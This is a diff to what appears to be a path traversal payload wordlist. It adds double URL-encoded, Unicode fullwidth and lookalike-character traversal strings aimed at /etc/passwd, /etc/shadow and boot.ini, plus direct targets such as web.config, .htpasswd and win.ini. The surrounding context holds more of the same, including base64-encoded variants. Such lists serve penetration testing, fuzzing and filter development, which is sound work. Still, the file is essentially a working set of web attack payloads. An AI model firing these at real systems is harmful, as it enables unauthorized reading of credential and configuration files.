@@ -15,6 +15,8 @@
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
 ..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
@@ -81,6 +83,11 @@ C:\boot.ini
 C:/inetpub/wwwroot/global.asa
 C:\inetpub\wwwroot\global.asa
 c:\inetpub\wwwroot\index.asp
+web.config
+/web.config
+\web.config
+../web.config
+..\web.config
 /config.asp
 ../config.asp
 config.asp
@@ -111,6 +118,7 @@ db.php
 ../../../../../../../dev
 /D:\Program Files\
 d:\System32\Inetsrv\metabase.xml
+/etc/apache2/.htpasswd
 /etc/apache2/apache2.conf
 /etc/apache2/conf/httpd.conf
 /etc/apache2/httpd.conf
@@ -779,6 +787,8 @@ users/.htpasswd
 /Volumes/webBackup/private/etc/httpd/httpd.conf.default
 /web/conf/php.ini
 /WINDOWS\php.ini
+C:\Windows\win.ini
+C:/Windows/win.ini
 ../../windows/win.ini
 ../../../../../../../../windows/win.ini
 ..\..\..\..\..\..\..\..\windows\win.ini
@@ -912,3 +922,9 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdyUwMA==
+%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%ef%bd%85%ef%bd%94%e2%85%bd%ef%bc%8f%ef%bd%90%ef%bd%81%ef%bd%93%ef%bd%93%ef%bd%97%e2%85%be
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%ef%bd%82%ef%bd%8f%ef%bd%8f%ef%bd%94%e2%80%a4%e2%85%b0%ef%bd%8e%e2%85%b0
+..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8boot.ini
+..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bcboot.ini
+///////../../../etc/passwd
